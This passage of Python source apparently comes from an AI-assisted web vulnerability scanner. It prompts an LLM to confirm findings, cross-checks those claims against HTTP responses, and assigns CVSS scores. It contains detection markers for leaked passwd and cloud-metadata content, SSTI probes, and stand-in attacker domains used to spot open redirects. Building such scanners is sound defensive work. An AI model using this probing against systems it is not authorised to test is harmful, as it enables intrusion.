**IMPORTANT:** Be conservative. Many scanners report false positives. Only confirm if you see CLEAR exploitation evidence.

Respond with exactly one of:
- "CONFIRMED: [brief explanation of why this is definitely exploitable]"
- "FALSE_POSITIVE: [brief explanation of why this is not a real vulnerability]" """

        try:
            system = self._get_enhanced_system_prompt("confirmation", vuln_type=vuln_type)
            ai_response = await self.llm.generate(prompt, system)

            if "CONFIRMED" not in ai_response.upper():
                return False

            # Anti-hallucination: cross-validate AI claim against actual HTTP response
            if not self._cross_validate_ai_claim(vuln_type, payload, response, ai_response):
                await self.log("debug", f"  AI said CONFIRMED but cross-validation failed for {vuln_type}")
                return False

            return True
        except:
            # If AI fails, do NOT blindly trust - apply strict technical check
            await self.log("debug", f"  AI confirmation failed, using strict technical verification")
            return self._strict_technical_verify(vuln_type, payload, response if isinstance(response, str) else "", evidence)

    def _cross_validate_ai_claim(self, vuln_type: str, payload: str,
                                  response_body: str, ai_response: str) -> bool:
        """Cross-validate AI's CONFIRMED claim against actual HTTP response.

        Even when AI says 'CONFIRMED', we verify that the claimed evidence
        actually exists in the HTTP response body. This prevents hallucinated
        confirmations.
        """
        body = response_body.lower() if response_body else ""

        if vuln_type in ("xss", "xss_reflected", "xss_stored"):
            # XSS: payload must exist AND be in executable/interactive context
            if not payload:
                return True  # Can't validate without payload
            if payload.lower() not in body and payload not in (response_body or ""):
                return False  # Payload not reflected at all
            from backend.core.xss_context_analyzer import analyze_xss_execution_context
            ctx = analyze_xss_execution_context(response_body or "", payload)
            return ctx["executable"] or ctx["interactive"]

        elif vuln_type in ("sqli", "sqli_error"):
            # SQLi: at least one DB error pattern must be in body
            db_patterns = [
                "sql syntax", "mysql_", "pg_query", "sqlite", "ora-0",
                "sqlstate", "odbc", "unclosed quotation", "syntax error"
            ]
            return any(p in body for p in db_patterns)

        elif vuln_type in ("lfi", "path_traversal"):
            # LFI: file content markers must be present
            markers = ["root:x:", "daemon:x:", "www-data:", "[boot loader]"]
            return any(m.lower() in body for m in markers)

        elif vuln_type == "ssti":
            # SSTI: evaluated result must exist, raw expression should not
            if "49" in body and "7*7" not in body:
                return True
            if "9" in body and "3*3" not in body and "3*3" in (payload or ""):
                return True
            return False

        elif vuln_type in ("rce", "command_injection"):
            # RCE: command output markers
            markers = ["uid=", "gid=", "root:x:", "/bin/"]
            return any(m in body for m in markers)

        elif vuln_type in ("ssrf", "ssrf_cloud"):
            # SSRF: must have actual internal resource content, NOT just status/length diff
            ssrf_markers = ["ami-id", "instance-id", "instance-type", "local-hostname",
                           "computemetadata", "root:x:0:0:"]
            return any(m in body for m in ssrf_markers)

        elif vuln_type == "open_redirect":
            # Open redirect: must have actual redirect evidence
            if response_body:
                import re as _re
                location_match = _re.search(r'location:\s*(\S+)', response_body, _re.IGNORECASE)
                if location_match:
                    loc = location_match.group(1)
                    return any(d in loc for d in ["evil.com", "attacker.com"])
            return False

        elif vuln_type in ("crlf_injection", "header_injection"):
            # CRLF: injected header name/value must appear in response
            injected_indicators = ["x-injected", "x-crlf-test", "injected"]
            return any(ind in body for ind in injected_indicators)

        elif vuln_type == "xxe":
            # XXE: file content from entity expansion
            markers = ["root:x:", "daemon:x:", "[boot loader]"]
            return any(m.lower() in body for m in markers)

        elif vuln_type == "nosql_injection":
            # NoSQL: error patterns
            nosql_markers = ["mongoerror", "bsoninvalid", "casterror"]
            return any(m in body for m in nosql_markers)

        # For other types, default to False (don't trust AI blindly)
        return False

    @staticmethod
    def _evidence_in_response(claimed_evidence: str, response_body: str) -> bool:
        """Check if AI-claimed evidence actually exists in the HTTP response.

        Extracts quoted strings and key phrases from evidence text,
        then checks if they appear in the actual response body.
        """
        if not claimed_evidence or not response_body:
            return False

        body_lower = response_body.lower()

        # Extract quoted strings from evidence
        import re
        quoted = re.findall(r'["\']([^"\']{3,})["\']', claimed_evidence)
        for q in quoted:
            if q.lower() in body_lower:
                return True

        # Extract key technical phrases
        key_phrases = re.findall(r'\b(?:error|exception|root:|uid=|daemon|mysql|sqlite|admin|password)\w*', claimed_evidence.lower())
        for phrase in key_phrases:
            if phrase in body_lower:
                return True

        return False

    def _strict_technical_verify(self, vuln_type: str, payload: str, response_body: str, evidence: str) -> bool:
        """Strict technical verification when AI is not available.
        Only confirms findings with high-confidence evidence patterns."""
        body = response_body.lower() if response_body else ""

        if vuln_type in ("xss", "xss_reflected", "xss_stored", "xss_dom"):
            # XSS: payload must appear in executable/interactive context
            if not payload:
                return False
            if payload.lower() not in body and payload not in (response_body or ""):
                return False
            from backend.core.xss_context_analyzer import analyze_xss_execution_context
            ctx = analyze_xss_execution_context(response_body or "", payload)
            return ctx["executable"] or ctx["interactive"]

        elif vuln_type == "sqli":
            # SQLi: must have actual DB error messages, not generic "error" text
            strong_indicators = [
                "you have an error in your sql syntax",
                "unclosed quotation mark",
                "mysql_fetch", "mysql_query", "mysqli_",
                "pg_query", "pg_exec",
                "sqlite3.operationalerror", "sqlite_error",
                "ora-00", "ora-01",
                "microsoft ole db provider for sql",
                "sqlstate[",
                "syntax error at or near",
                "unterminated quoted string",
                "quoted string not properly terminated",
            ]
            for indicator in strong_indicators:
                if indicator in body:
                    return True
            return False

        elif vuln_type == "lfi":
            # LFI: must have actual file content markers
            strong_markers = ["root:x:0:0:", "daemon:x:", "www-data:", "[boot loader]", "[fonts]"]
            for marker in strong_markers:
                if marker in body:
                    return True
            return False

        elif vuln_type == "ssti":
            # SSTI: only confirm if expression was evaluated
            if "49" in body and "7*7" not in body and ("{{7*7}}" in payload or "${7*7}" in payload):
                return True
            return False

        elif vuln_type == "rce":
            # RCE: must have command output
            rce_markers = ["uid=", "gid=", "root:x:0:0"]
            for marker in rce_markers:
                if marker in body:
                    return True
            return False

        elif vuln_type == "ssrf":
            # SSRF: must access internal resources
            if "root:x:0:0" in body or "ami-" in body or "instance-id" in body:
                return True
            return False

        elif vuln_type == "open_redirect":
            # Open redirect: evidence must mention redirect to external domain
            if "evil.com" in evidence.lower() or "redirect" in evidence.lower():
                return True
            return False

        elif vuln_type == "nosql_injection":
            # NoSQL: must have actual NoSQL error patterns
            nosql_errors = [
                "mongoerror", "bsoninvalid", "bson.errors",
                "castexception", "json parse error", "invalid $",
            ]
            for err in nosql_errors:
                if err in body:
                    return True
            return False

        elif vuln_type == "html_injection":
            # HTML injection: payload tag must appear unescaped in response
            if not payload:
                return False
            payload_lower = payload.lower()
            html_tags = ["<h1", "<div", "<marquee", "<b>", "<u>", "<font", "<form"]
            for tag in html_tags:
                if tag in payload_lower and tag in body:
                    escaped = tag.replace("<", "&lt;")
                    if escaped not in body:
                        return True
            return False

        elif vuln_type == "parameter_pollution":
            # HPP: without baseline, cannot confirm — reject
            return False

        elif vuln_type == "type_juggling":
            # Type juggling: without baseline, cannot confirm — reject
            return False

        elif vuln_type == "jwt_manipulation":
            # JWT: without baseline, require very strong evidence
            if "admin" in body and "true" in body:
                return True
            return False

        # Default: reject unknown types without AI
        return False

    # ── AI Enhancement Methods ──────────────────────────────────────────

    async def _ai_interpret_response(self, vuln_type: str, payload: str,
                                      response_excerpt: str) -> Optional[str]:
        """Use AI to interpret an HTTP response after a vulnerability test.

        Returns a brief interpretation of what happened (reflected, filtered, etc.).
        """
        if not self.llm.is_available():
            return None

        try:
            prompt = f"""Briefly analyze this HTTP response after testing for {vuln_type.upper()}.

Payload sent: {payload[:200]}

Response excerpt (first 1000 chars):
```
{response_excerpt[:1000]}
```

Answer in 1-2 sentences: Was the payload reflected? Filtered? Blocked by WAF? Ignored? What happened?"""

            system = self._get_enhanced_system_prompt("interpretation", vuln_type=vuln_type)
            result = await self.llm.generate(prompt, system)
            return result.strip()[:300] if result else None
        except Exception:
            return None

    async def _ai_validate_exploitation(self, finding_dict: Dict) -> Optional[Dict]:
        """Use AI to validate whether a confirmed finding is truly exploitable.

        Returns analysis dict with effectiveness assessment and notes.
        """
        if not self.llm.is_available():
            return None

        try:
            prompt = f"""Evaluate this confirmed vulnerability finding for real-world exploitability.

**Finding:**
- Type: {finding_dict.get('vulnerability_type', '')}
- Severity: {finding_dict.get('severity', '')}
- Endpoint: {finding_dict.get('affected_endpoint', '')}
- Parameter: {finding_dict.get('parameter', '')}
- Payload: {finding_dict.get('payload', '')[:200]}
- Evidence: {finding_dict.get('evidence', '')[:500]}

Respond in this exact JSON format:
{{"effective": true/false, "impact_level": "critical/high/medium/low", "exploitation_notes": "brief notes", "false_positive_risk": "low/medium/high", "additional_steps": ["step1", "step2"]}}"""

            system = self._get_enhanced_system_prompt("confirmation")
            result = await self.llm.generate(prompt, system)
            if not result:
                return None

            # Extract JSON from response
            import json as _json
            # Try to find JSON in the response
            start = result.find('{')
            end = result.rfind('}')
            if start >= 0 and end > start:
                return _json.loads(result[start:end + 1])
            return None
        except Exception:
            return None

    async def _ai_suggest_next_tests(self, findings_summary: str,
                                      targets: List[str]) -> List[str]:
        """Use AI to suggest additional vulnerability types to test based on findings so far.

        Returns a list of vuln_type strings for additional testing.
        """
        if not self.llm.is_available():
            return []

        try:
            prompt = f"""Based on these vulnerability scan findings, suggest up to 5 additional vulnerability types to test.

**Current findings:**
{findings_summary[:1500]}

**Targets tested:**
{chr(10).join(targets[:5])}

Available vulnerability types: sqli_error, sqli_union, sqli_blind, sqli_time, xss_reflected, xss_stored, xss_dom, ssti, command_injection, lfi, path_traversal, ssrf, open_redirect, idor, csrf, cors_misconfig, nosql_injection, xxe, deserialization, jwt_manipulation, race_condition, mass_assignment, graphql_introspection, subdomain_takeover, http_request_smuggling, cache_poisoning, prototype_pollution

Respond with ONLY a JSON array of vulnerability type strings to test next:
["type1", "type2", ...]"""

            system = self._get_enhanced_system_prompt("strategy")
            result = await self.llm.generate(prompt, system)
            if not result:
                return []

            import json as _json
            start = result.find('[')
            end = result.rfind(']')
            if start >= 0 and end > start:
                suggestions = _json.loads(result[start:end + 1])
                # Validate against known types
                valid = [s for s in suggestions if isinstance(s, str) and s in self.VULN_TYPE_MAP]
                return valid[:5]
            return []
        except Exception:
            return []

    def _create_finding(self, vuln_type: str, url: str, param: str,
                        payload: str, evidence: str, response: Dict,
                        ai_confirmed: bool = False) -> Finding:
        """Create a finding object with full details from VulnEngine registry"""
        mapped = self._map_vuln_type(vuln_type)
        severity = self._get_severity(vuln_type)
        finding_id = hashlib.md5(f"{vuln_type}{url}{param}".encode()).hexdigest()[:8]

        parsed = urlparse(url)
        path = parsed.path or '/'

        # Build a more realistic HTTP request representation
        full_url = response.get('url', url)
        method = response.get('method', 'GET')
        status = response.get('status', 200)
        injection_point = response.get('injection_point', 'parameter')
        injected_header = response.get('injected_header', '')

        # Build HTTP request based on injection point
        if injection_point == "header" and injected_header:
            http_request = f"""{method} {path} HTTP/1.1
Host: {parsed.netloc}
{injected_header}: {payload}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: close"""
        elif injection_point == "body":
            http_request = f"""{method} {path} HTTP/1.1
Host: {parsed.netloc}
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Connection: close

{param}={payload}"""
        elif injection_point == "path":
            http_request = f"""{method} {path}/{payload} HTTP/1.1
Host: {parsed.netloc}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Connection: close"""
        else:
            http_request = f"""{method} {path}?{param}={payload} HTTP/1.1
Host: {parsed.netloc}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: close"""

        # Format response excerpt
        response_body = response.get('body', '')[:1000]
        http_response = f"""HTTP/1.1 {status} OK
Content-Type: {response.get('content_type', 'text/html')}

{response_body}"""

        # Pull rich metadata from VulnEngine registry
        registry_title = self.vuln_registry.get_title(mapped)
        cwe_id = self.vuln_registry.get_cwe_id(mapped)
        description = self.vuln_registry.get_description(mapped)
        impact = self.vuln_registry.get_impact(mapped)
        remediation = self.vuln_registry.get_remediation(mapped)

        # Generate PoC code
        poc_code = ""
        try:
            poc_code = self.poc_generator.generate(
                vuln_type, full_url, param, payload, evidence, method
            )
        except Exception:
            pass

        return Finding(
            id=finding_id,
            title=registry_title or f"{vuln_type.upper()} in {path}",
            severity=severity,
            vulnerability_type=vuln_type,
            cvss_score=self._get_cvss_score(vuln_type),
            cvss_vector=self._get_cvss_vector(vuln_type),
            cwe_id=cwe_id,
            description=description,
            affected_endpoint=full_url,
            parameter=param,
            payload=payload,
            evidence=evidence,
            impact=impact,
            poc_code=poc_code,
            remediation=remediation,
            response=http_response,
            request=http_request,
            ai_verified=ai_confirmed,
            confidence="90" if ai_confirmed else "50",
            confidence_score=90 if ai_confirmed else 50,
        )

    # CVSS vectors keyed by registry type (fallback for types without tester)
    _CVSS_VECTORS = {
        # Critical (9.0+)
        "command_injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
        "sqli_error": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "sqli_union": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "ssti": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "rfi": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
        "insecure_deserialization": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "auth_bypass": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
        "ssrf_cloud": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N",
        "container_escape": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
        "expression_language_injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        # High (7.0-8.9)
        "sqli_blind": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
        "sqli_time": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
        "lfi": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "ssrf": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N",
        "xxe": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L",
        "path_traversal": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "nosql_injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
        "file_upload": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
        "privilege_escalation": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
        "jwt_manipulation": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
        "arbitrary_file_read": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "arbitrary_file_delete": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H",
        "zip_slip": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
        "bola": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N",
        "bfla": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
        "ldap_injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
        "xpath_injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "http_smuggling": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
        "subdomain_takeover": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:N",
        "mass_assignment": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
        "race_condition": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
        "cloud_metadata_exposure": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
        "host_header_injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
        "orm_injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
        "soap_injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
        "graphql_injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
        "session_fixation": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
        "oauth_misconfiguration": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
        "default_credentials": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "s3_bucket_misconfiguration": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
        "serverless_misconfiguration": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
        "source_code_disclosure": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "api_key_exposure": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        # Medium (4.0-6.9)
        "xss_reflected": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
        "xss_stored": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N",
        "xss_dom": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
        "blind_xss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
        "mutation_xss": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N",
        "idor": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N",
        "csrf": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
        "open_redirect": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N",
        "cors_misconfig": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N",
        "clickjacking": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
        "crlf_injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N",
        "header_injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
        "email_injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:N",
        "log_injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
        "html_injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N",
        "csv_injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
        "prototype_pollution": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
        "cache_poisoning": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
        "parameter_pollution": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
        "type_juggling": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
        "forced_browsing": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "directory_listing": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "debug_mode": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "exposed_admin_panel": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
        "exposed_api_docs": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "insecure_cookie_flags": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N",
        "graphql_introspection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "graphql_dos": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
        "dom_clobbering": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N",
        "postmessage_vulnerability": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
        "websocket_hijacking": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
        "css_injection": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N",
        "tabnabbing": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N",
        "rate_limit_bypass": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L",
        "business_logic": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N",
        "timing_attack": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "weak_password": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
        "brute_force": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
        "two_factor_bypass": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
        "backup_file_exposure": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "sensitive_data_exposure": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "excessive_data_exposure": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
        "rest_api_versioning": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "api_rate_limiting": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
        # Low / Info (0-3.9)
        "security_headers": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N",
        "ssl_issues": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "http_methods": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
        "information_disclosure": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "version_disclosure": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "improper_error_handling": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "cleartext_transmission": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "weak_encryption": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
        "weak_hashing": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "weak_random": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N",
        "vulnerable_dependency": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
        "outdated_component": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "insecure_cdn": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N",
    }

    _CVSS_SCORES = {
        # Critical
        "command_injection": 10.0, "sqli_error": 9.8, "sqli_union": 9.8,
        "ssti": 9.8, "rfi": 9.8, "insecure_deserialization": 9.8,
        "expression_language_injection": 9.8, "container_escape": 9.0,
        "auth_bypass": 9.1, "ssrf_cloud": 9.1, "default_credentials": 9.1,
        # High
        "sqli_blind": 7.5, "sqli_time": 7.5, "lfi": 7.5, "ssrf": 7.5,
        "xxe": 7.5, "path_traversal": 7.5, "nosql_injection": 7.5,
        "ldap_injection": 7.5, "xpath_injection": 7.5, "orm_injection": 7.5,
        "graphql_injection": 7.5, "soap_injection": 7.5,
        "jwt_manipulation": 8.2, "file_upload": 8.8,
        "privilege_escalation": 8.8, "bfla": 8.1,
        "arbitrary_file_read": 7.5, "arbitrary_file_delete": 7.5,
        "zip_slip": 7.5, "http_smuggling": 8.1,
        "subdomain_takeover": 8.2, "mass_assignment": 7.5,
        "race_condition": 7.5, "cloud_metadata_exposure": 8.6,
        "host_header_injection": 6.5, "session_fixation": 7.5,
        "oauth_misconfiguration": 8.1, "s3_bucket_misconfiguration": 7.5,
        "serverless_misconfiguration": 7.5,
        "source_code_disclosure": 7.5, "api_key_exposure": 7.5,
        "two_factor_bypass": 7.5, "bola": 6.5,
        "type_juggling": 7.4, "backup_file_exposure": 7.5,
        "excessive_data_exposure": 6.5,
        # Medium
        "xss_reflected": 6.1, "xss_stored": 6.1, "xss_dom": 6.1,
        "blind_xss": 6.1, "mutation_xss": 5.4,
        "crlf_injection": 5.4, "csv_injection": 6.1,
        "email_injection": 5.4, "html_injection": 4.7,
        "prototype_pollution": 5.6, "cache_poisoning": 5.4,
        "graphql_dos": 7.5,
        "idor": 5.3, "csrf": 4.3, "open_redirect": 4.3,
        "cors_misconfig": 4.3, "clickjacking": 4.3,
        "header_injection": 4.3, "log_injection": 4.3,
        "forced_browsing": 5.3,
        "parameter_pollution": 4.3, "timing_attack": 5.9,
        "dom_clobbering": 4.7, "postmessage_vulnerability": 6.1,
        "websocket_hijacking": 5.3, "css_injection": 4.3, "tabnabbing": 4.3,
        "directory_listing": 5.3, "debug_mode": 5.3,
        "exposed_admin_panel": 5.3, "exposed_api_docs": 5.3,
        "insecure_cookie_flags": 4.3,
        "rate_limit_bypass": 4.3, "business_logic": 5.3,
        "sensitive_data_exposure": 5.3,
        "weak_password": 5.3, "brute_force": 5.3,
        "graphql_introspection": 5.3,
        "rest_api_versioning": 3.7, "api_rate_limiting": 4.3,
        "cleartext_transmission": 5.9, "weak_encryption": 5.9,
        # Low / Info
        "security_headers": 2.6, "ssl_issues": 3.7, "http_methods": 3.1,
        "information_disclosure": 3.7, "version_disclosure": 3.1,
        "improper_error_handling": 3.7,
        "weak_hashing": 3.7, "weak_random": 3.7,
        "vulnerable_dependency": 5.3, "outdated_component": 3.7,
        "insecure_cdn": 3.7,
    }

    def _get_cvss_vector(self, vuln_type: str) -> str:
        """Get CVSS 3.1 vector string for vulnerability type via registry"""
        mapped = self._map_vuln_type(vuln_type)
        return self._CVSS_VECTORS.get(mapped, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N")

    def _get_severity(self, vuln_type: str) -> str:
        """Get severity for vulnerability type from VulnEngine registry"""
        mapped = self._map_vuln_type(vuln_type)
        return self.vuln_registry.get_severity(mapped)

    def _get_cvss_score(self, vuln_type: str) -> float:
        """Get CVSS score for vulnerability type"""
        mapped = self._map_vuln_type(vuln_type)
        return self._CVSS_SCORES.get(mapped, 5.0)

    # ==================== AI ENHANCEMENT ====================

    async def _ai_enhance_findings(self):
        """Enhance findings with AI-generated details"""
        if not self.llm.is_available():
            await self.log("info", "  Skipping AI enhancement (LLM not available)")
            return

        for finding in self.findings:
            await self.log("info", f"  Enhancing: {finding.title}")
            enhanced = await self._enhance_single_finding(finding)

            finding.cwe_id = enhanced.get("cwe_id", "")
            finding.description = enhanced.get("description", "")
            finding.impact = enhanced.get("impact", "")
            finding.poc_code = enhanced.get("poc_code", "")
            finding.remediation = enhanced.get("remediation", "")
            finding.references = enhanced.get("references", [])

            if enhanced.get("cvss_score"):
                finding.cvss_score = enhanced["cvss_score"]
            if enhanced.get("cvss_vector"):
                finding.cvss_vector = enhanced["cvss_vector"]

    async def _enhance_single_finding(self, finding: Finding) -> Dict:
        """AI enhancement for single finding"""
        prompt = f"""Generate comprehensive details for this confirmed security vulnerability to include in a professional penetration testing report.

**Vulnerability Details:**
- Type: {finding.vulnerability_type.upper()}
- Title: {finding.title}
- Affected Endpoint: {finding.affected_endpoint}
- Vulnerable Parameter: {finding.parameter}
- Payload Used: {finding.payload}
- Evidence: {finding.evidence}

**Required Output:**

1. **CVSS 3.1 Score:** Calculate accurately based on:
   - Attack Vector (AV): Network (most web vulns)
   - Attack Complexity (AC): Low/High based on prerequisites
   - Privileges Required (PR): None/Low/High
   - User Interaction (UI): None/Required
   - Scope (S): Unchanged/Changed
   - Impact: Confidentiality/Integrity/Availability

2. **CWE ID:** Provide the MOST SPECIFIC CWE for this vulnerability type:
   - SQL Injection: CWE-89 (or CWE-564 for Hibernate)
   - XSS Reflected: CWE-79, Stored: CWE-79
   - LFI: CWE-22 or CWE-98
   - SSTI: CWE-94 or CWE-1336
   - SSRF: CWE-918
   - RCE: CWE-78 (OS Command) or CWE-94 (Code Injection)

3. **Description:** Write 2-3 paragraphs explaining:
   - What the vulnerability is and how it was discovered
   - Technical details of how the exploitation works
   - The specific context in this application

4. **Impact:** Describe REALISTIC business and technical impact:
   - What data/systems could be compromised?
